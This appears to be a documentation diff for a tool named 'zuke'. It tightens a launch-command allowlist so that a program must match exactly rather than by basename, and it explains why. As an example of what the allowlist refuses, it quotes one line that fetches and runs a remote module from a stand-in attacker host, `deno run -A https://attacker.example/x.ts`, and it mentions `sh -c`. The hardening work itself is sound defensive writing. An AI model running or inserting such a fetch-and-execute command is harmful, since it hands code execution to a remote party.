@@ -651,13 +651,17 @@ tool in an already-running server with **no restart**:
   the program **and its arguments**, so `deno run -A https://attacker.example/x.ts`
   is the refused remote-module case spelled as a command, and `sh -c …` is
   arbitrary code with no fetch at all. A command location is therefore refused
-  unless its program appears in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (same spelling:
-  comma- or space-separated, `*` allows any). The entry is matched against
-  `command[0]` both as written and as its trailing path segment, so `make`
-  admits `/usr/bin/make` while `/usr/bin/make` admits only itself. Naming a bare
-  program admits any program resolving under that name, and naming an
-  interpreter (`sh`, `deno`, `node`) hands the registry writer full execution,
-  since the arguments are theirs — both are the operator's call. The refusal is
+  unless its program appears in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (comma-separated,
+  since a program path may contain a space; `*` allows any). The entry must match
+  `command[0]` **exactly**, case-folded — deliberately not by basename, because
+  the descriptor chooses the program string, so admitting `/tmp/anywhere/make`
+  because an operator wrote `make` would point a trusted name at a file of the
+  writer's own. A refusal names the exact string to add. Two consequences are the
+  operator's call: a **relative** program resolves against the descriptor's own
+  working directory, which the same writer chooses, so prefer an absolute path;
+  and listing an interpreter (`sh`, `deno`, `node`) hands the registry writer
+  full execution, since the arguments are theirs — listing `deno` reinstates
+  exactly what `ZUKE_REGISTRY_LAUNCH_HOSTS` exists to refuse. The refusal is
   a structured `launch_command_not_allowed` error, audited as `denied`, before
   the confirmation prompt, with nothing spawned. `zuke register` writes a module
   location, so this only bites a hand-authored or second-party entry.
